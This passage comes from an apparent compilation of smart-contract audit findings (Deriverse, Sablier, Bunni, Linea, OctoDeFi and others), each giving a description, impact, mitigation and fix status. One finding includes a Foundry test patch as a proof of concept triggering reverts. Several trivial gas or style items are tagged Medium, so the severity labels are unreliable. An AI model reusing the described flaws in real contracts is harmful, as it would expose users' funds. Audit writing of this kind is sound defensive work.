   - leverage stored as 5

2. User calls `perp_deposit()` to add more margin
   - `new_for_perp()` called with leverage=0
   - leverage RESET to `max_leverage` (e.g., 15x)

3. User now has 15x leverage instead of 5x

**Impact:** Users who carefully set their leverage to a conservative value (e.g., 2x or 3x) will have it silently reset to `max_leverage` after performing any perp operation. This significantly increases their liquidation risk without their knowledge.

**Recommended Mitigation:** Only update leverage when explicitly requested (i.e., when `leverage > 0`). Remove the else branch that overwrites leverage with `max_leverage`:
```rust
if leverage > 0 {
    // Only update leverage when explicitly provided
    unsafe {
        (*state.perp_info2).mask &= 0xFFFFFF00;
        (*state.perp_info2).mask |= (leverage as u32).min(header.max_leverage as u32);
    }
}
// When leverage == 0, keep existing leverage unchanged
```
**Deriverse:** Fixed in commit: https://github.com/deriverse/protocol-v1/commit/e15ad9372bf10322c6d05c234189576b8aad3690

**Cyfrin:** Verified.

## [M-58] Withdraw Instruction Trying to Create New Asset Records for Non-Existent Tokens Instead of Failing
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The `withdraw` instruction uses `alloc=true` when resolving the token asset, which tries the creation of a new asset record with zero balance if the token doesn't exist, instead of immediately failing with an appropriate error. While the transaction eventually fails, this behavior wastes account space and violates the semantic expectation that withdrawals should only operate on existing assets.

In `withdraw.rs`, the resolve function is called with `alloc=true`:

```rust
client_state.resolve(AssetType::Token, data.token_id, TokenType::Asset, true)?;
```

When `find_or_alloc_asset `is called with `alloc=true` and the asset doesn't exist in `client_primary`, it:
- Creates a new asset record with asset_id set to the token ID
- Initializes the balance to 0
- Potentially reallocates the account if no free slot is available

Subsequently, `sub_asset_tokens(data.amount)` is called, which subtracts the withdrawal amount from 0, resulting in a negative balance. The check then fails with InsufficientFunds.

```rust
    client_state.sub_asset_tokens(data.amount)?;
    if client_state.asset_tokens()? < 0 {
        bail!(InsufficientFunds);
    }
```

This is semantically incorrect because:
- Withdrawals should only operate on existing assets with positive balances


Note:

In some cases, the `finalize_spot` will be called in `clean_generic`.
```rust
    if accounts.len() > 11 + extra_accounts {
        client_state.clean_generic(accounts_iter, accounts.len() - 11 - extra_accounts)?;
    }
```

But the asset record will be created anyway in `clean_generic`:

```rust
            self.resolve_instr(client_infos_acc, false)?;
```

So, we don't ever need to put `alloc=true`:
```rust
    if accounts.len() > 11 + extra_accounts {
        client_state.clean_generic(accounts_iter, accounts.len() - 11 - extra_accounts)?;
    }
    client_state.resolve(AssetType::Token, data.token_id, TokenType::Asset, true)?;
```

**Impact:** The instruction should fail immediately if the token doesn't exist, not create a record first.

**Recommended Mitigation:** Change the `alloce` to `false`
```rust
client_state.resolve(AssetType::Token, data.token_id, TokenType::Asset, false)?;
```

**Deriverse:** Fixed in commit [45ee168](https://github.com/deriverse/protocol-v1/commit/45ee1680acdf605aeb52796f7d5f29d169d1a7e5).

**Cyfrin:** Verified.

## [M-59] Missing zero address validation in initialize function
- Severity: `Medium`
- Source report: `dstokenswap.md`

### Detailed Content (from source)
**Description:** The `initialize` function in `DSTokenClassSwap` contract does not validate that the input addresses `_sourceDSToken` and `_targetDSToken` are non-zero addresses.

```solidity
DSTokenClassSwap.sol
40:     function initialize(address _sourceDSToken, address _targetDSToken) public override onlyProxy initializer {
41:         __BaseDSContract_init();
42:         sourceDSToken = IDSToken(_sourceDSToken);//@audit-issue INFO check zero address
43:         sourceServiceConsumer = IDSServiceConsumer(_sourceDSToken);
44:         targetDSToken = IDSToken(_targetDSToken);
45:         targetServiceConsumer = IDSServiceConsumer(_targetDSToken);
46:     }
```

**Recommended Mitigation:** Add zero address validation checks.

**Securitize:** Fixed in commit [b26a16](https://bitbucket.org/securitize_dev/bc-dstoken-class-swap-sc/commits/b26a167524dfa96fc92dc18a863998a50e533bf2).

**Cyfrin:** Verified.


\clearpage

## [M-60] Immutable Curve pool dependency creates long-term redemption risk for adapter vaults
- Severity: `Medium`
- Source report: `escrow.md`

### Detailed Content (from source)
**Description:** `SablierLidoAdapter` uses an immutable `CURVE_POOL` address (`SablierLidoAdapter.sol:36`) as the **sole exit path** from stETH back to ETH during unstaking. The entire redemption flow for adapter vaults depends on this single Curve pool:

```solidity
// SablierLidoAdapter.sol:367-389 — the ONLY path from wstETH to WETH
function _wstETHToWeth(uint128 wstETHAmount) private returns (uint128 wethReceived) {
    uint256 stETHAmount = IWstETH(WSTETH).unwrap(wstETHAmount);
    uint256 expectedEthOut = ICurveStETHPool(CURVE_POOL).get_dy(1, 0, stETHAmount);
    uint256 minEthOut = ud(expectedEthOut).mul(UNIT.sub(slippageTolerance)).unwrap();
    uint256 ethReceived = ICurveStETHPool(CURVE_POOL).exchange(1, 0, stETHAmount, minEthOut);
    // ...
}
```

Bob vaults are designed to lock tokens for potentially long durations — years or even decades. During this time:

- `CURVE_POOL` is immutable; there is no setter or migration function
- There is no fallback exit path (e.g., Lido's native withdrawal queue)
- There is no admin rescue function to recover stuck wstETH
- There is no alternative DEX or liquidity source

If the specific Curve stETH/ETH pool referenced by `CURVE_POOL` loses liquidity, is deprecated, migrates to a new version, or becomes non-functional at any point during a vault's lifetime, all adapter vault redemptions permanently revert. The wstETH remains locked in the adapter with no recovery mechanism.

Notably, Lido introduced a native withdrawal queue (mid-2023) that provides a guaranteed 1:1 stETH→ETH exit without any DEX liquidity dependency. The adapter does not use this as either a primary or fallback path.

**Impact:** All adapter vaults become permanently unredeemable if the immutable Curve pool becomes unusable. The staked WETH (plus accumulated yield) is locked forever. This affects every user who entered an adapter vault, with no admin intervention possible.

The likelihood is low since the Curve stETH/ETH pool is one of the most established DeFi pools, but the 10-20 year vault horizons exceed the entire lifespan of DeFi to date. Any of the following could trigger the issue: Curve v1 deprecation, pool migration to Curve v2/v3, governance-mandated pool shutdown, or sustained liquidity drain.

**Recommended Mitigation:** Add Lido's native withdrawal queue as a fallback (or primary) unstaking path. This provides a guaranteed 1:1 exit that doesn't depend on any DEX liquidity:

```solidity
// Add as a fallback when Curve swap fails or as the primary path
ILidoWithdrawalQueue(WITHDRAWAL_QUEUE).requestWithdrawals(amounts, address(this));
// ... wait for finalization ...
ILidoWithdrawalQueue(WITHDRAWAL_QUEUE).claimWithdrawals(requestIds, hints);
```

Alternatively, make the Curve pool address updatable by the comptroller so it can be migrated to a new pool if the original is deprecated:

```solidity
function setCurvePool(address newPool) external onlyComptroller {
    curvePool = newPool;
    IStETH(STETH).approve(newPool, type(uint256).max);
}
```

**Sablier:** Fixed in commits:
* [f9c14e2](https://github.com/sablier-labs/lockup/commit/f9c14e2f6d4ba6a9d4309cb45408ba20e6a0d393) - integrating Lido native withdrawal
* [6ddfaac](https://github.com/sablier-labs/lockup/commit/6ddfaacf0f243fe3f15efa564c58719fa8a71d5e) - implement mitigation feedback to prevent vault unstaked via Curve from also being used to initiate Lido withdrawals

**Cyfrin:** Verified; there are now two exclusive options for redemption: Curve & Lido Withdrawals. For a given vault:
* if no Lido withdrawal has been initiated, any user can initiate a Curve redemption which prevents subsequent Lido withdrawals for the same vault
* if no Curve redemption has been initiated, the `Comptroller` can initiate a Lido Withdrawal which prevents Curve redemptions for the same vault

## [M-61] Use named return variables where this can optimize away local variables
- Severity: `Medium`
- Source report: `escrow.md`

### Detailed Content (from source)
**Description:** Use named return variables where this can optimize away local variables:
* `SablierBob::_safeTokenSymbol`

**Sablier:** Fixed in commit [0c05295](https://github.com/sablier-labs/lockup/commit/0c05295253e369d1d0549ebd7256b3807313cd3a).

**Cyfrin:** Verified.

## [M-62] Unnecessary usage of `non Reentrant` modifier on `Referral Manager::complete First Purchase`
- Severity: `Medium`
- Source report: `final.md`

### Detailed Content (from source)
**Description:** `ReferralManager::completeFirstPurchase` has in place the `nonReentrant` modifier from the `ReentrancyGuardTransientUpgradeable` library, but this function is not susceptible to reentrancy.
- The caller is restricted to be the `TokenBank` contract, and the only external call is to do a transfer of stablecoin to the referrer.

As long as the stablecoin is set correctly to a valid contract, there is no need to use the `nonReentrant` modifier.

**Recommended Mitigation:** `nonReentrant` modifier is not required. Remove the import of `ReentrancyGuardTransientUpgradeable` library.

**Remora**
Fixed in commit [59a33a4](https://github.com/remora-projects/remora-dynamic-tokens/commit/59a33a40bfcdc585d5a24a58108fcd4f2e583a05)

**Cyfrin:** Verified.

\clearpage

## [M-63] In Solidity don't initialize to default values
- Severity: `Medium`
- Source report: `harbor.md`

### Detailed Content (from source)
**Description:** In Solidity don't initialize to default values:
```solidity
Agreement.sol
95:        for (uint256 i = 0; i < _contactDetails.length; i++) {
105:        for (uint256 i = 0; i < _chains.length; i++) {
114:            for (uint256 j = 0; j < _chains[i].accounts.length; j++) {
125:        for (uint256 i = 0; i < _chains.length; i++) {
137:            for (uint256 j = 0; j < _chains[i].accounts.length; j++) {
149:        for (uint256 i = 0; i < _chains.length; i++) {
158:            for (uint256 j = 0; j < _chains[i].accounts.length; j++) {
169:        for (uint256 i = 0; i < _caip2ChainIds.length; i++) {
192:        for (uint256 i = 0; i < _accounts.length; i++) {
207:        for (uint256 i = 0; i < _accountAddresses.length; i++) {
235:        for (uint256 i = 0; i < _details.contactDetails.length; ++i) {
241:        for (uint256 i = 0; i < _details.chains.length; ++i) {
247:            for (uint256 j = 0; j < _details.chains[i].accounts.length; ++j) {
257:        for (uint256 i = 0; i < _chains.length; i++) {
288:        for (uint256 i = 0; i < _chains.length; i++) {
307:        for (uint256 i = 0; i < contactsLength; ++i) {
314:        for (uint256 i = 0; i < chainsLength; ++i) {
321:            for (uint256 j = 0; j < accts.length; ++j) {
365:        for (uint256 i = 0; i < length; ++i) {
378:        for (uint256 i = 0; i < length; i++) {
398:        for (uint256 i = 0; i < chainAccounts.length; i++) {

SafeHarborRegistry.sol
34:        uint256 migratedCount = 0;
36:        for (uint256 i = 0; i < length; i++) {

ChainValidator.sol
39:        for (uint256 i = 0; i < length; i++) {
64:        for (uint256 i = 0; i < length; i++) {
80:        for (uint256 i = 0; i < length; i++) {
```

**SafeHarbor:**
Fixed in commit [ed67312](https://github.com/PatrickAlphaC/safe-harbor/commit/ed67312d7679596fe554503406283bd9194430bb).

**Cyfrin:** Verified.

## [M-64] Prefer `calldata` instead of `memory` for read-only external inputs
- Severity: `Medium`
- Source report: `harbor.md`

### Detailed Content (from source)
**Description:** Prefer `calldata` instead of `memory` for read-only external inputs which also don't get passed to internal functions that need them in `memory`:

* `Agreement.sol`
```solidity
84:    function setProtocolName(string memory _protocolName) external onlyOwner {
91:    function setContactDetails(Contact[] memory _contactDetails) external onlyOwner {
// for `_accounts` only
187:    function addAccounts(string memory _caip2ChainId, Account[] memory _accounts) external onlyOwner {
```

* `ChainValidator.sol`
```solidity
35:    function initialize(address _initialOwner, string[] memory _initialValidChains) external initializer {
```

**SafeHarbor:**
Fixed in commits [d72fd17](https://github.com/PatrickAlphaC/safe-harbor/commit/d72fd17a1e57aa9060f456e2b0d47591de6b9a56), [754edb9](https://github.com/PatrickAlphaC/safe-harbor/commit/754edb9c10e5830a99cf6ada4c8792728b25e2fe).

**Cyfrin:** Verified.

## [M-65] Remove obsolete final `return` statement when already using named returns
- Severity: `Medium`
- Source report: `harbor.md`

### Detailed Content (from source)
**Description:** Remove obsolete final `return` statement when already using named returns:

* `AgreementFactory::create`

**SafeHarbor:**
Fixed in commit [220e5fb](https://github.com/PatrickAlphaC/safe-harbor/commit/220e5fb0af3f1750fd066a933f23f72124c37a6e).

**Cyfrin:** Verified.

## [M-66] Insufficient clamping in `Hooklet Lib::hooklet Before Swap` can result in unexpected reverts
- Severity: `Medium`
- Source report: `hooklet.md`

### Detailed Content (from source)
**Description:** `HookletLib::hookletBeforeSwap` and `HookletLib::hookletBeforeSwapView` decode the fee and price override data returned from external hooklet calls, applying a clamping operation on these values to ensure that they lie within specified bounds:

```solidity
// clamp the override values to the valid range
fee = feeOverridden ? uint24(fee.clamp(0, SWAP_FEE_BASE)) : 0;
sqrtPriceX96 =
    priceOverridden ? uint160(sqrtPriceX96.clamp(TickMath.MIN_SQRT_PRICE, TickMath.MAX_SQRT_PRICE)) : 0;
```

However, the following edge cases have not been accounted for:
* Use of `SWAP_FEE_BASE` as the inclusive upper bound contradicts validation elsewhere throughout the codebase, for example in `BunniHookLogic::isValidParams` and `FeeOverrideHooklet::setFeeOverride` where a fee equal to `SWAP_FEE_BASE` is explicitly prevented. Allowing this value may cause a division-by-zero error in downstream logic such as `BunniHookLogic::beforeSwap` which relies on `SWAP_FEE_BASE - fee` to be non-zero.
* Bounding the overridden `sqrtPriceX96` to the range `[TickMath.MIN_SQRT_PRICE, TickMath.MAX_SQRT_PRICE]` fails to consider the sqrt price corresponding to the range of usable ricks $r_{\min} = \left\lfloor \frac{t_{\min}}{w} \right\rfloor\cdot w$ and $r_{\max} = \bigl(\lfloor \tfrac{t_{\max}}{w} \rfloor - 1\bigr) \cdot w$ as defined in the whitepaper. Allowing prices outside of this range may cause reverts due to the use of invalid ticks when `getSqrtPriceAtTick()` is called.

**Impact:** If the fee override value equals `SWAP_FEE_BASE`, this may result in a revert due to division-by-zero during further swap execution in `BunniHookLogic::beforeSwap`. If the sqrt price is such that the corresponding tick lies outside the range of usable ricks then execution will similarly revert within this invocation.

**Proof of Concept:** Apply the following patch:

```diff
---
 test/BunniHook.t.sol | 110 +++++++++++++++++--------------------------
 1 file changed, 41 insertions(+), 65 deletions(-)

diff --git a/test/BunniHook.t.sol b/test/BunniHook.t.sol
index 0a7978bd..25f3eb08 100644
--- a/test/BunniHook.t.sol
+++ b/test/BunniHook.t.sol
@@ -8,6 +8,9 @@ import {IAmAmm} from "biddog/interfaces/IAmAmm.sol";
 import "./BaseTest.sol";
 import {BunniStateLibrary} from "../src/lib/BunniStateLibrary.sol";

+import {SWAP_FEE_BASE} from "src/base/Constants.sol";
+import {CustomRevert} from "@uniswap/v4-core/src/libraries/CustomRevert.sol";
+
 contract BunniHookTest is BaseTest {
     using TickMath for *;
     using FullMathX96 for *;
@@ -1388,12 +1391,6 @@ contract BunniHookTest is BaseTest {
         ldf_.setMinTick(-30);

         // deploy pool with hooklet
-        // this should trigger:
-        // - before/afterInitialize
-        // - before/afterDeposit
-        uint24 feeMin = 0.3e6;
-        uint24 feeMax = 0.5e6;
-        uint24 feeQuadraticMultiplier = 1e6;
         (Currency currency0, Currency currency1) = (Currency.wrap(address(token0)), Currency.wrap(address(token1)));
         (IBunniToken bunniToken, PoolKey memory key) = _deployPoolAndInitLiquidity(
             currency0,
@@ -1401,11 +1398,12 @@ contract BunniHookTest is BaseTest {
             ERC4626(address(0)),
             ERC4626(address(0)),
             ldf_,
+            IHooklet(hooklet),
             ldfParams,
             abi.encodePacked(
-                feeMin,
-                feeMax,
-                feeQuadraticMultiplier,
+                uint24(0.3e6),
+                uint24(0.5e6),
+                uint24(1e6),
                 FEE_TWAP_SECONDS_AGO,
                 POOL_MAX_AMAMM_FEE,
                 SURGE_HALFLIFE,
@@ -1419,68 +1417,46 @@ contract BunniHookTest is BaseTest {
                 true, // amAmmEnabled
                 ORACLE_MIN_INTERVAL,
                 MIN_RENT_MULTIPLIER
-            )
+            ),
+            bytes32("")
         );
-        address depositor = address(0x6969);
-
-        // transfer bunniToken
-        // this should trigger:
-        // - before/afterTransfer
-        address recipient = address(0x8008);
-        vm.startPrank(depositor);
-        bunniToken.transfer(recipient, bunniToken.balanceOf(depositor));
-        vm.stopPrank();
-        vm.startPrank(recipient);
-        bunniToken.transfer(depositor, bunniToken.balanceOf(recipient));
-        vm.stopPrank();

-        // withdraw liquidity
-        // this should trigger:
-        // - before/afterWithdraw
-        vm.startPrank(depositor);
-        hub.withdraw(
-            IBunniHub.WithdrawParams({
-                poolKey: key,
-                recipient: depositor,
-                shares: bunniToken.balanceOf(depositor),
-                amount0Min: 0,
-                amount1Min: 0,
-                deadline: block.timestamp,
-                useQueuedWithdrawal: false
-            })
-        );
-        vm.stopPrank();
-
-        // shift LDF to trigger rebalance during the next swap
-        ldf_.setMinTick(-20);
-
-        // make swap
-        // this should trigger:
-        // - before/afterSwap
+        // make swap to trigger beforeSwap
         _mint(currency0, address(this), 1e6);
         IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
-            zeroForOne: true,
-            amountSpecified: -int256(1e6),
-            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
+            zeroForOne: false,
+            amountSpecified: int256(1e6),
+            sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
         });
-        vm.recordLogs();
-        _swap(key, params, 0, "");

-        // fill rebalance order
-        // this should trigger:
-        // - afterRebalance
-        Vm.Log[] memory logs = vm.getRecordedLogs();
-        Vm.Log memory orderEtchedLog;
-        for (uint256 i = 0; i < logs.length; i++) {
-            if (logs[i].emitter == address(floodPlain) && logs[i].topics[0] == IOnChainOrders.OrderEtched.selector) {
-                orderEtchedLog = logs[i];
-                break;
-            }
-        }
-        IFloodPlain.SignedOrder memory signedOrder = abi.decode(orderEtchedLog.data, (IFloodPlain.SignedOrder));
-        IFloodPlain.Order memory order = signedOrder.order;
-        _mint(key.currency0, address(this), order.consideration.amount);
-        floodPlain.fulfillOrder(signedOrder);
+        hooklet.setBeforeSwapOverride(true, uint24(SWAP_FEE_BASE), false, uint24(0));
+        vm.expectRevert(
+            abi.encodeWithSelector(
+                CustomRevert.WrappedError.selector,
+                key.hooks,
+                BunniHook.beforeSwap.selector,
+                abi.encodePacked(bytes4(keccak256("MulDivFailed()"))),
+                abi.encodePacked(bytes4(keccak256("HookCallFailed()")))
+            )
+        );
+        _swap(key, params, 0, "");
+
+        int24 tickAtPrice = TickMath.MIN_TICK;
+        uint160 priceOverride = TickMath.getSqrtPriceAtTick(tickAtPrice);
+        hooklet.setBeforeSwapOverride(false, uint24(0), true, priceOverride);
+        vm.expectRevert(
+            abi.encodeWithSelector(
+                CustomRevert.WrappedError.selector,
+                key.hooks,
+                BunniHook.beforeSwap.selector,
+                abi.encodeWithSelector(
+                    TickMath.InvalidTick.selector,
+                    tickAtPrice - ((tickAtPrice % key.tickSpacing + key.tickSpacing) % key.tickSpacing)
+                ),
+                abi.encodePacked(bytes4(keccak256("HookCallFailed()")))
+            )
+        );
+        _swap(key, params, 0, "");
     }
--
2.40.0

```

**Recommended Mitigation:** Update the clamping logic in both `HookletLib::hookletBeforeSwap` and `HookletLib::hookletBeforeSwapView` to subtract one from `SWAP_FEE_BASE` to prevent allowing this as a valid upper bound and align the behavior with other instances where similar validation is already performed:

```diff
- fee = feeOverridden ? uint24(fee.clamp(0, SWAP_FEE_BASE)) : 0;
+ fee = feeOverridden ? uint24(fee.clamp(0, SWAP_FEE_BASE - 1)) : 0;
```

Additionally prevent the overridden price from being specified as corresponding to a tick that is outside the range of usable ricks:

```diff
- sqrtPriceX96 =
-   priceOverridden ? uint160(sqrtPriceX96.clamp(TickMath.MIN_SQRT_PRICE, TickMath.MAX_SQRT_PRICE)) : 0;
+ sqrtPriceX96 =
+   priceOverridden ? uint160(sqrtPriceX96.clamp(TickMath.getSqrtPriceAtTick((TickMath.MIN_TICK / key.tickSpacing) * key.tickSpacing), TickMath.getSqrtPriceAtTick(((TickMath.MAX_TICK / key.tickSpacing) - 1) * key.tickSpacing))) : 0;
```

**Bacon Labs:** Fixed in commits [45643ef](https://github.com/Bunniapp/bunni-v2/pull/135/commits/45643eff21be8d3671bea025aae5ffd11a0f6467) and [0b5a708](https://github.com/Bunniapp/bunni-v2/pull/135/commits/0b5a708e5bafb12308dbab1c8db478ac991bae2f).

**Cyfrin:** Verified. The fee clamping logic has been modified to prevent `SWAP_FEE_BASE` from being used. The price clamping logic has also been modified to bound the override between the sqrt prices corresponding to the minimum and maximum usable ticks.

\clearpage

## [M-67] Outdated reference to rebalance in `IHooklet::after Swap` should be removed
- Severity: `Medium`
- Source report: `hooklet.md`

### Detailed Content (from source)
**Description:** There is an outdated reference to rebalance in the `IHooklet::afterSwap` dev comment which should be removed given `IHooklet::afterRebalance` has since been added:

```solidity
    /// @notice Called after a swap operation.
@>  /// @dev Also called after a rebalance order execution, in which case returnData will only have
@>  /// inputAmount and outputAmount filled out.
    /// @param sender The address of the account that initiated the swap.
    /// @param key The Uniswap v4 pool's key.
    /// @param params The swap's input parameters.
    /// @param returnData The swap operation's return data.
    function afterSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        SwapReturnData calldata returnData
    ) external returns (bytes4 selector);
```

**Bacon Labs:** Fixed in commit [0189567](https://github.com/Bunniapp/bunni-v2/pull/135/commits/018956782d344d0d5e27a0fc193872dce430e1a4).

**Cyfrin:** Verified. The reference has been removed.

## [M-68] Missing revert of LST withdrawal when `L1Message Service` balance is exactly equal to required value
- Severity: `Medium`
- Source report: `manager.md`

### Detailed Content (from source)
**Description:** The `LineaRollupYieldExtension::claimMessageWithProofAndWithdrawLST` function is designed to withdraw LST tokens from a yield provider only when the `L1MessageService` balance is insufficient to fulfil message delivery. According to the function's documentation, it should "revert if the `L1MessageService` has sufficient balance to fulfill the message delivery." However, the balance check uses a strict less-than operator (`<`) instead of less-than-or-equal-to (`<=`):

```solidity
if (_params.value < address(this).balance) {
  revert LSTWithdrawalRequiresDeficit();
}
```

This means when `_params.value` is exactly equal to `address(this).balance`, the condition evaluates to false and the function proceeds with LST withdrawal, even though the contract has sufficient balance to fulfil the claim without withdrawing from the yield provider.

**Impact:** When the contract balance exactly matches the claim value, the function will incorrectly proceed with withdrawing LST from the yield provider instead of reverting. This results in:

1. Unnecessary LST withdrawal when funds are already available

2. Gas waste for the caller

3. Violation of the stated invariant that LST withdrawal should only occur when there is a balance deficit

4. Potential operational inefficiencies in the yield management system

**Recommended Mitigation:** Change the comparison operator from `<` to `<=` to ensure the function reverts when the balance is sufficient (including when it's exactly equal):

```solidity
if (_params.value <= address(this).balance) {
  revert LSTWithdrawalRequiresDeficit();
}
```

This ensures that LST withdrawal only occurs when there is an actual deficit (`_params.value > address(this).balance`).

**Linea:** Fixed in commit [9722a2a](https://github.com/Consensys/linea-monorepo/commit/9722a2a048c9e0c0f0dd8bf959a37516e7590b8d).

**Cyfrin:** Verified.

## [M-69] Refactor duplicated checks into modifiers
- Severity: `Medium`
- Source report: `manager.md`

### Detailed Content (from source)
**Description:** Refactor duplicated checks into modifiers:
* `YieldManager.sol`:
```solidity
// duplicated in `receiveFundsFromReserve` and `withdrawLST`
if (msg.sender != L1_MESSAGE_SERVICE) {
  revert SenderNotL1MessageService();
}

// duplicated in `receiveFundsFromReserve`, `fundYieldProvider`, `unpauseStaking`
if (isWithdrawalReserveBelowMinimum()) {
  revert InsufficientWithdrawalReserve();
}

// duplicated in `unstakePermissionless` and `replenishWithdrawalReserve`
if (!isWithdrawalReserveBelowMinimum()) {
  revert WithdrawalReserveNotInDeficit();
}

// duplicated in `initiateOssification` and `progressPendingOssification`
if ($$.isOssified) {
  revert AlreadyOssified();
}
```

**Linea:** Fixed in commit [e832420](https://github.com/Consensys/linea-monorepo/commit/e832420b45c5513d8d19adc74e0db4492917c2d50) implemented the first 3 suggestions.

**Cyfrin:** Verified.

## [M-70] Settlement of liabilities and obligations lacks optimization for priority repayment, leading to accumulation of unpaid negative yield in the system
- Severity: `Medium`
- Source report: `manager.md`

### Detailed Content (from source)
**Description:** Interest accrued on `lstLiabilities` and operational costs (obligations) is designated for priority settlement using the yield generated from staked ETH. Only the residual yield—after full settlement of all debts (encompassing both obligations and liabilities)—is to be reported as positive yield to Linea (L2).

The payment of liabilities and obligations is architected to execute concurrently with yield reporting, triggered exclusively upon detection of a positive yield delta.

The incorrect misprioritization in settlement is derived from a dependency on sufficient vault balance: transactions are gated by the `stVault's` available liquidity. If the vault lacks funds, liability settlement is deferred, resulting in unpaid negative yield accrual.

Consider a scenario wherein 100% of `ETH` within an `stVault` is allocated to staking:
```
- At T0:
dashboard.totalValue = 100 ETH
userFunds = 100 ETH
stVault.availableBalance = 0 ETH
no obligations nor liabilities

- At T1 - 1 ETH worth of yield has been generated, and 0.1 ETH of obligations has been incurred
dashboard.totalValue = 101 ETH
userFunds = 100 ETH
stVault.availableBalance = 0 ETH
obligations (fees/liabilities) = 0.1 ETH
- Here, 1 ETH worth of positive yield is detected, but no payment is possible because the stVault has no balance (therefore, no withdrawal is possible)
- So, that 1 ETH is reported as a positive yield to the L2, leaving 0.1 ETH as obligations.

- At T2 - A partial withdrawal for 1 ETH from the BeaconChain is completed, and another 0.1 ETH on obligations and yield is accounted
dashboard.totalValue = 101.1 ETH
userFunds = 101 ETH
stVault.availableBalance = 1 ETH
obligations (fees/liabilities) = 0.2 ETH

- At T3 - Yield is reported, 1 more ETH has been earned as yield and obligations
dashboard.totalValue = 102.1 ETH
userFunds = 101 ETH
stVault.availableBalance = 1 ETH
obligations (fees/liabilities) = 1.1 ETH

This time 1 ETH of obligations is paid off, but 0.1 ETH is still pending.

The issue is that at T1, 1ETH was reported as yielding a positive return, even though there were actually outstanding obligations that needed to be paid. Therefore, payment of obligations was not prioritized correctly; instead, yield distribution took precedence.

```

**Impact:** Negative yield accrues within the system, resulting in the following effects:

1. **Diminished Effective Yield on Staked ETH**: The real yield derived from staked ETH is reduced when stETH rebases at a percentage exceeding the accrued staking interest. This discrepancy arises because the delayed settlement of liabilities allows interest on the `lstLiabilities` to compound over time, thereby amplifying the shortfall.

2. **Exacerbation of Other Issues**: The accumulation of negative yield proceeds without appropriate tracking mechanisms, thereby intensifying the deficiencies outlined in a related issue.

**Recommended Mitigation:** The idea would be to account for the obligations and liabilities at the moment of determining if there is a positive yield, as opposed to optimistically assuming the vault has enough balance to pay them. In this way, the "positive yield" would be reserved as payment of liabilities/obligations for when the vault has balance (i.e. a withdrawal of the generated yield from the beacon chain is completed).

Bottom line is, do not report positive yield to the L2 when there are pending payments, the yield should be reserved to give priority to repayment of debts, and only until all debt is settled, only then the generated yield should be reported to the L2.

In code, the fix would looks something along the lines of:
- Where `ALL_OBLIGATIONS` includes liabilities, obligations and node fee
```diff
  function reportYield(
    address _yieldProvider
  ) external onlyDelegateCall returns (uint256 newReportedYield, uint256 outstandingNegativeYield) {
    ...
    uint256 lastUserFunds = $$.userFunds;
    uint256 totalVaultFunds = _getDashboard($$).totalValue();
    // Gross positive yield
-    if (totalVaultFunds > lastUserFunds) {
+    if (totalVaultFunds > lastUserFunds + ALL_OBLIGATIONS ) {
      ...
      // Gross negative yield
    } else {
      newReportedYield = 0;
      outstandingNegativeYield = lastUserFunds - totalVaultFunds;
    }
  }

```

**Linea:** Fixed in commit [0e46ee](https://github.com/Consensys/linea-monorepo/commit/0e46ee6efe6ed79526f2a2ed55c1ca82f7e0e663).

**Cyfrin:** Verified. Positive yield is now reported only when the total value held by the underlying `stVault` exceeds all liabilities, obligations, and fees. When no positive yield is generated, `outstandingNegativeYield` is accumulated on the system. Payment of liabilities, obligations and fees is attempted each time `reportYield` is executed.

## [M-71] Automation Do S via blacklisted or reverting fee recipients
- Severity: `Medium`
- Source report: `octodefi.md`

### Detailed Content (from source)
**Description:** `FeeHandler.handleFee()` uses `safeTransferFrom()` to forward ERC-20 tokens to `beneficiary`, `creator`, `vault`, and `burnerAddress`. If any of those addresses are **black-listed** by USDT/USDC (transfer returns false) the call reverts.
`handleFeeETH()` uses `transfer()` which has a limitation of 2300 gas units; if the destination contract’s `receive()` reverts, for example a smart contract wallet that executes more logic than could be covered by the gas limit, the whole automation fails.
```solidity
IERC20(token).safeTransferFrom(msg.sender, beneficiary, beneficiaryAmount);

if (creator != address(0)) {
    IERC20(token).safeTransferFrom(msg.sender, creator, creatorAmount);
    IERC20(token).safeTransferFrom(msg.sender, vault, vaultAmount);
} else {
    IERC20(token).safeTransferFrom(msg.sender, vault, vaultAmount + creatorAmount);
}

if (burnAmount > 0) {
    IERC20(token).safeTransferFrom(msg.sender, burnerAddress, burnAmount);
}
```

```solidity
payable(beneficiary).transfer(beneficiaryAmount);

if (creator != address(0)) {
    payable(creator).transfer(creatorAmount);
    payable(vault).transfer(vaultAmount);
} else {
    payable(vault).transfer(vaultAmount + creatorAmount);
}

if (burnAmount > 0) {
    payable(burnerAddress).transfer(burnAmount);
}
```
**Impact:** Denial of service on all future `executeAutomation()` calls for the strategies with a blacklisted or reverting `creator`.

**Recommended Mitigation:** Use a **pull** pattern where each entity could claim fees on its own instead of a push funds model, or `try/catch` around transfers so a single failing destination cannot block execution. Additionally avoid making native token transfers using `transfer()` but rather leverage some library that implements safe native token transfers.

**OctoDeFi:** Fixed in PR [\#14](https://github.com/octodefi/strategy-builder-plugin/pull/14).

**Cyfrin:** Verified. A withdrawal method has been implemented to allow users to claim their accumulated fee balances. Note that native token transfers still rely on the `transfer()` method which should also be updated. Application of the `nonReentrant()` modifier is also not necessary.

**OctoDeFi:** Fixed in commit [7c48784](https://github.com/octodefi/strategy-builder-plugin/commit/7c48784640163998a9265f580d3b18aa46bc36a6).

**Cyfrin:** Verified. The Solady `SafeTransferLib` is now used for all token transfers.

## [M-72] `Allow List::has Trade Restriction` mutability should be set to `view`
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** `AllowList::hasTradeRestriction` does not make any changes to storage, it simply reads some variables and makes some checks, but the function's mutability is not marked as view.

**Recommended Mitigation:** Change mutability to view.

**Remora:** Fixed in commit [81faadb](https://github.com/remora-projects/remora-smart-contracts/commit/81faadbd3baa1deec950db08abf635c5a277a7c5).

**Cyfrin:** Verified.

## [M-73] `Lock Up Manager::Lock Up Storage::_reg Lock Up Time` is never used
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** `LockUpManager::LockUpStorage::_regLockUpTime` is never used:
```solidity
$ rg "_regLockUpTime"
RWAToken/LockUpManager.sol
36:        uint32 _regLockUpTime; //lock up time for foreign to domestic trades
```

Either remove it or add a comment noting it will be used in the future but is currently not used.

